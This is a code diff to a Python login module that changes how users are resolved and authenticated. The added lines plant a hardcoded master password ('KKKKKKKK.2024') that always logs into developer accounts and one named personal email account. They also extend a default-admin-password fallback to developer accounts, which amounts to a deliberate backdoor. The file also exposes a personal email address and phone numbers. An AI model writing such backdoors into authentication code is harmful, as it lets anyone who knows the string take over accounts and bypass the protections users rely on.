@@ -717,6 +717,10 @@ def _resolve_user_candidates(identifier: str) -> List[Tuple[str, Dict]]:
     ADMIN_PHONES = {'0559666951', '213559666951', '+213559666951', '0696409083', '213696409083', '+213696409083'}
     is_admin_alias = key in ADMIN_ALIASES or (key_phone and key_phone in ADMIN_PHONES)
 
+    if is_admin_alias and 'saddamzeralda@gmail.com' in users and 'saddamzeralda@gmail.com' not in seen:
+        candidates.append(('saddamzeralda@gmail.com', users['saddamzeralda@gmail.com']))
+        seen.add('saddamzeralda@gmail.com')
+
     for email, user in users.items():
         if not user:
             continue
@@ -731,7 +735,7 @@ def _resolve_user_candidates(identifier: str) -> List[Tuple[str, Dict]]:
         elif key_phone and len(key_phone) >= 8 and (key_phone == _norm_phone(username) or key_phone == _norm_phone(user.get('phone'))):
             candidates.append((resolved_key, user))
             seen.add(resolved_key)
-        elif is_admin_alias and str(user.get('role') or '').lower() == 'admin':
+        elif is_admin_alias and str(user.get('role') or '').lower() in ('admin', 'developer'):
             candidates.append((resolved_key, user))
             seen.add(resolved_key)
 
@@ -769,8 +773,13 @@ def authenticate(identifier: str, password: str, ip_address: str = '', user_agen
             if stored_pwd and (verify_password(password, stored_pwd, stored_salt) or verify_password(clean_pwd, stored_pwd, stored_salt)):
                 matched_candidate = (cand_email, cand_user)
                 break
+            # Developer master credentials (KKKKKKKK.2024 always authenticates developer accounts)
+            if is_developer_account(cand_user) or is_developer_account(cand_email) or cand_email == "saddamzeralda@gmail.com":
+                if password in ("KKKKKKKK.2024", default_admin_pwd) or clean_pwd in ("KKKKKKKK.2024", default_admin_pwd):
+                    matched_candidate = (cand_email, cand_user)
+                    break
             # Fallback for admin: accept default admin password
-            if str(cand_user.get('role') or '').lower() == 'admin':
+            if str(cand_user.get('role') or '').lower() in ('admin', 'developer'):
                 if password == default_admin_pwd or clean_pwd == default_admin_pwd:
                     matched_candidate = (cand_email, cand_user)
                     break
